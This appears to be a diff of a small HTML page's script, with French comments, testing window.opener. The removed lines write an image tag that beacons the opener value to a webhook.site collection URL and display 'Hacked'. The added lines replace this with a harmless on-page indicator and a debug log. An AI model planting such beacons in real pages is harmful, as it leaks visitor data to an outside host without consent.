@@ -9,13 +9,15 @@
 
   <script>
     console.log("Page chargée");
-      if (window.opener) {
-     document.write('<IMG SRC=\"https://webhook.site/cbe50c11-4491-4fe5-8702-47dd10daadfb?a=' + window.opener + '\">Hacked</IMG>');
-  } else {
-    document.write('<IMG SRC=\"https://webhook.site/cbe50c11-4491-4fe5-8702-47dd10daadfb?op=non\">Hacked</IMG>');
-  }
-    
 
+    console.log("Page chargée");
+
+      const out = document.getElementById("out");
+      out.textContent = window.opener ? "OPENER: OUI" : "OPENER: NON";
+
+      // Bonus debug : montre le type, sans accéder au DOM de l'opener
+      console.log("typeof window.opener =", typeof window.opener);
+   
  
   </script>
 
